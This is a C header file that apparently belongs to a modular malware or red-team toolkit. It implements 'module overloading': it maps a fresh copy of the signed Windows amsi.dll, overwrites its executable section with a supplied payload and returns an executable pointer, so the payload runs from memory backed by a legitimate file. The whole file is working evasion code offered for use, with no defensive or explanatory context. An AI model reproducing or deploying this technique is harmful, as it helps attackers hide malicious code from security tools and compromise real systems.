/* chunk: evasion/module_overload
 * category: evasion
 * depends: api_resolve
 * provides: module_overload
 * description: Module overloading — map a fresh copy of a legitimate signed DLL
 *   via NtMapViewOfSection (not the already-loaded one), then overwrite its .text
 *   section with payload code. The mapped image retains the DLL's signed metadata
 *   in memory, and the payload executes from a region backed by a legitimate file.
 *   Distinct from module_stomp (which modifies the already-loaded copy).
 */

#ifndef MODULE_OVERLOAD_H
#define MODULE_OVERLOAD_H

#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pNtCreateSection)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
    HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);

static LPVOID module_overload_map(const BYTE *payload, DWORD payload_size) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    pNtCreateSection fnCreateSection =
        (pNtCreateSection)GetProcAddress(ntdll, "NtCreateSection");
    pNtMapViewOfSection fnMapView =
        (pNtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");

    if (!fnCreateSection || !fnMapView) return NULL;

    WCHAR dllPath[MAX_PATH];
    GetSystemDirectoryW(dllPath, MAX_PATH);
    lstrcatW(dllPath, L"\\amsi.dll");

    HANDLE hFile = CreateFileW(
        dllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return NULL;

    HANDLE hSection = NULL;
    NTSTATUS status = fnCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        NULL,
        PAGE_READONLY,
        SEC_IMAGE,
        hFile
    );
    CloseHandle(hFile);

    if (status != 0 || !hSection) return NULL;

    PVOID baseAddr = NULL;
    SIZE_T viewSize = 0;
    status = fnMapView(
        hSection,
        GetCurrentProcess(),
        &baseAddr,
        0,
        0,
        NULL,
        &viewSize,
        1,
        0,
        PAGE_READONLY
    );
    CloseHandle(hSection);

    if (status != 0 || !baseAddr) return NULL;

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)baseAddr;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)((BYTE *)baseAddr + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

    PVOID textAddr = NULL;
    DWORD textSize = 0;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            textAddr = (BYTE *)baseAddr + sec[i].VirtualAddress;
            textSize = sec[i].Misc.VirtualSize;
            break;
        }
    }

    if (!textAddr || textSize < payload_size) return NULL;

    DWORD oldProtect;
    VirtualProtect(textAddr, payload_size, PAGE_READWRITE, &oldProtect);
    memcpy(textAddr, payload, payload_size);
    VirtualProtect(textAddr, payload_size, PAGE_EXECUTE_READ, &oldProtect);

    return textAddr;
}

#endif
